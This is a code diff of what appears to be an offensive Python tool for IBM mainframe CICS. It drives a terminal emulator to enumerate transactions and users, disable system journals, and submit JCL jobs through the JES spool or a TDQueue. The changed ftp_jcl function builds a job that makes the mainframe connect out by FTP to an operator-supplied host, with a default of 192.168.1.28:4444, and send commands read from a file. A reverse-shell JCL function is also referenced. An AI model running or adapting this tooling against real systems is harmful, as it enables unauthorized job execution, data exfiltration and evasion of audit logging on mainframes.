@@ -177,6 +177,7 @@ def sleep():
 
 def signal_handler(signal, frame):
         print 'Done !'
+        os._exit(0)
         sys.exit(0)
 
 def printProgress (iteration, total, prefix = '', suffix = '', decimals = 1, barLength = 100):
@@ -210,6 +211,7 @@ def format_request(request):
        request +=" "
     
     return request
+
 def show_screen():
     data = em.screen_get();
     for d in data:
@@ -267,7 +269,6 @@ def do_authenticate(userid, password, pos_pass):
       whine('Incorrect password information','err')
       sys.exit();
     
-             
 def check_valid_applid(applid, do_authent, method = 1):
     """
        Tries to access a CICS app in VTAM screen. If VTAM needs
@@ -417,7 +418,7 @@ def send_cics(request, double=False):
     if "RESPONSE: NORMAL" in data[22]:
         return True
     else:
-        whine(data[22],'err')
+        whine('Error:' + data[22],'err')
         return False
 
 def get_hql_files():
@@ -464,6 +465,7 @@ def get_hql_libraries():
     
     em.send_pf3()
     return None
+
 def get_users():
     """
       Called by get_infos(). retrieves active users
@@ -641,7 +643,6 @@ def get_transactions(transid):
      if number_tran == 0:
        whine('No transaction matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')
 
-
 def get_files(filename):
      """
         Get all files defined in CICS
@@ -805,7 +806,6 @@ def get_file_content():
        next_ridfld = fetch_content(filename, ridfld, keylength)
        next_ridfld = format(int(next_ridfld)+1, "0"+str(keylength))
          
-
 def dummy_jcl(lhost):
     """
         PoC that executes an FTP to verify Job submission and network filtering
@@ -913,55 +913,57 @@ def reverse_jcl(lhost, username="CICSUSEB"):
   return jcl_code
 
 def ftp_jcl(lhost):
-	"""
+  """
      JOB that initiates an FTP connection from the mainframe to your FTP server
      
   """
-	job_name = username
-	tmp = rand_name(randrange(3,7))
-	
+  if not results.ftp_cmds:
+      whine('Please point towards a valid ftp file containing commands to send','err');
+      sys.exit();
+  cmds_file = open(results.ftp_cmds,'r')
+  if not cmds_file:
+      whine('Could not open file '+results.ftp_cmds,'err');
+      sys.exit();
   
-	jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
-//FTP00001 EXEC PGM=IKJEFT01,DYNAMNBR=50         
-//SYSTSPRT DD   SYSOUT=*                         
-//SYSIN    DD   DUMMY                             
-//SYSPRINT DD   DUMMY                             
-//SYSTSIN  DD  *                                 
-FTP (EXIT
-"""+lhost.split(":")[0]+""" """+lhost.split(":")[1]+"""
-ayoul3
-ayoul3
-ascii
-pwd
+  whine('Reading FTP commands from '+results.ftp_cmds,'info')
+  cmds = cmds_file.readlines();
+  cmds = ' '+' '.join(cmds)
+  
+  job_name = 'FTPCICS'
+  tmp = rand_name(randrange(3,7))  	
+  
+  jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
+//FTPSTP1  EXEC PGM=FTP,REGION=2048K,
+//             PARM='"""+lhost.split(":")[0]+""" """+lhost.split(":")[1]+"""(EXIT TIMEOUT 20'
+//OUTPUT   DD  SYSOUT=H
+//INPUT    DD  *
+"""+cmds+"""
 /*
 """
-	return jcl_code
-    
-def set_mixedCase(em):
+  return jcl_code
+
+def set_mixedCase():
     """
         Set the terminal to mixed case in case the JCL submitted containes OMVS code
     """
+    em.send_pf3();
     whine('Setting the current terminal to mixed case',kind='info')
-    em.safe_send('CEMT') #CICS APPLID in VTAM
+    em.move_to(1,2)
+    em.safe_send(format_request('CEMT I TASK')) #CICS APPLID in VTAM
     em.send_enter()
-    sleep()
-    if em.find_response( 'Inquire'):
-       pass
-    else:
-        whine('CEMT Inquire is not available',kind='err')
-        return -1
     
-    em.safe_send(format_request('CEMT I TASK'))
-    em.send_enter()
     data = em.screen_get()
     for d in data:
         termID = None
         if "Fac(" in d and "CEMT" in d:
             pos = d.find("Fac(")+len("Fac(")
             termID = d[pos:pos+4]
-            whine('Got TerminalID '+termID,kind='good')
+            whine('Got TerminalID '+termID,'good', 1)
             break;
-    
+    if not termID:
+        whine('Could not get terminal id via CEMT','err',1)
+        return False;
+        
     em.send_pf3();
     em.move_to(1,2);
     sleep()
@@ -970,11 +972,14 @@ def set_mixedCase(em):
     em.safe_send(format_request(req_set_term))
     em.send_enter()
     em.send_enter()
-    whine('Current terminal is NOW mixed case',kind='good')
-    em.send_pf3();
-    return 1
-    
-
+    if "NORMAL" in data[22]:
+      whine('Current terminal is NOW mixed case','good',1)
+    else:
+      whine('Could not set terminal to mixed case','err',1)
+      return False
+      
+    return True
+  
 def open_spool():
     """
         Opens a spool on the LOCAL node
@@ -1000,7 +1005,7 @@ def open_spool():
             pos = d.find("Token( '")+len("Token( '")
             token = d[pos:pos+8]
             if token.strip() != "" :
-                whine('Got token '+token,'good',1)
+                whine('Spool open ! Got token '+token,'good')
             break
     if "RESPONSE: NORMAL" not in data[22]:
         whine('Could not grab a valid token...a good chance the spool disabled, use -i to verify','err')
@@ -1011,6 +1016,7 @@ def spool_write(token, jcl):
     """
         Submits the JCL one record at a time via SPOOLWrite
     """
+    
     whine('Writting JCL to the spool (might take a few seconds)','info')      
     
     # write each line in a variable
@@ -1019,7 +1025,7 @@ def spool_write(token, jcl):
     for j in jcl.split("\n"):        
         if len(j) > 80:
             whine("JCL dataset cannot exceed 80 bytes per line",'err');
-            sys.exit()
+            return False
         # Go the variable screen
         em.send_pf5()
                 
@@ -1049,7 +1055,7 @@ def spool_write(token, jcl):
         # back to the normal screen
         em.send_enter();
         em.move_to(1,2)
-        req_spool_write = 'SPOOLWRITE TOKEN(&TOKTEST) FROM(&SQLKHDS) FLENGTH(80)'
+        req_spool_write = 'SPOOLWRITE TOKEN('+token+') FROM(&SQLKHDS) FLENGTH(80)'
         em.safe_send(format_request(req_spool_write));
         em.send_enter();  
         em.send_enter();
@@ -1063,9 +1069,10 @@ def spool_write(token, jcl):
                 
         data = em.screen_get();
         if "RESPONSE: NORMAL" not in data[22]:
-            whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
+            print ''
+            whine('Received error while writing JCL ('+str(i)+'):','err')
             whine(data[22],'err')
-            sys.exit();
+            return False
  
     whine('JCL Written successfully to the spool','good',1)   
     return 0
@@ -1129,27 +1136,35 @@ def close_spool():
     if "RESPONSE: NORMAL" not in data[22]:
             whine('Problem submitting the spool','err')
             whine(data[22],'err')
-            sys.exit();
+            return False
     whine('JOB submitted successfully to JES. Might take a few seconds to connect back','good',1)
-
-def write_tdqueue(jcl):
+    
+def check_tdqueue():
     """
-        Writes to a TDQueue pointing to INTRDR
+        Checking if TDQueue is available before submitting a JOB
     """
+    whine('Spool not available apparently, trying via TDQueue if available', 'info')
+    em.send_pf3();
     em.move_to(1,2);
-    queue='ssss'
+    queue='IRDR'
     if not results.queue:
-       whine('No queue name provided, assuming default IRDR', 'info')
+       whine('No queue name provided, assuming default: IRDR', 'info')
     else:
        queue = results.queue.upper()
     if not (send_cics('CEMT INQUIRE TDQueue ('+queue+')',False)):
         whine("No TDQueue named "+queue+" is installed on CICS",'err');
-        sys.exit();
+        return False
     
     # activate TDQueue in case it was not
     send_cics('Set TDQueue ('+queue+') OPE ENA',False)  
     em.send_pf3();
-     
+    return True
+    
+def write_tdqueue(jcl):
+    """
+        Writes to a TDQueue pointing to INTRDR
+    """
+         
     em.move_to(1,2)
     req_enq_tdq = "CECI ENQ RESOURCE("+queue+")"
     em.safe_send(format_request(req_enq_tdq))
@@ -1196,19 +1211,35 @@ def write_tdqueue(jcl):
         data = em.screen_get();
         if "RESPONSE: NORMAL" not in data[22]:
             whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
-            sys.exit();
+            return False
      
     req_deq_tdq = "CECI DEQ RESOURCE("+queue+")"
     em.safe_send(format_request(req_deq_tdq))
     em.send_enter();
     whine('JCL Written to TDqueue, it should be executed any second','good',1)
     
-  
 def submit_job(kind,lhost="192.168.1.28:4444"):
     """
         calls open_spool, spool_write and spool_close to submit a JOB.
         if open_spool fails, calls write_tdqueue
     """
+    if kind =="ftp" or kind =="custom":
+       set_mixedCase();
+    
+    method = None
+    token = open_spool();
+    
+    if token:
+         method = "spool"
+    elif not token and check_tdqueue():
+         method="tdqueue"
+    else:
+       whine('Can not submit JCL through this APPID','err')
+       sys.exit();
+    
+    # Setting mixed case terminal
+    
+    # Preparing JCL
     if results.jcl and kind=="custom":
        f = open(results.jcl,"r")
        lines = f.readlines()
@@ -1222,17 +1253,14 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
     elif kind=="ftp":
         jcl = ftp_jcl(lhost)
     
-        
-    token = open_spool();
-    #token = None
-    if token:
+    # Writting JCL        
+    if method=="spool":
         spool_write(token, jcl)
         close_spool()
-    else:
+    elif method=="tdqueue":
       em.send_pf3()
-      whine('Spool not available apparently, trying via TDQueue if available', 'info')
       write_tdqueue(jcl);
-
+   
 
 def activate_transaction(ena_trans):
     """
@@ -1285,7 +1313,6 @@ def disable_journal():
     else:
        whine("Only DFHLOG is defined, cannot disable this system log",'err');
 
-        
 def fetch_userids():
     """
         Looks in different menus for userids
@@ -1410,7 +1437,7 @@ def main(results):
         check_surrogat(results.surrogat_user)
     
     em.terminate()
-    
+  
 # not used
 def check_VTAM(em):
 	"""
@@ -1443,7 +1470,7 @@ def check_VTAM(em):
 if __name__ == "__main__" :
     
     logo();
-    
+        
         # Set the emulator intelligently based on your platform
     if platform.system() == 'Darwin':
       class WrappedEmulator(EmulatorIntermediate):
@@ -1488,6 +1515,7 @@ if __name__ == "__main__" :
     parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
 
     results = parser.parse_args()
+    
     
     em = WrappedEmulator(False)
     connect_zOS(em, results.IP+":"+results.PORT)
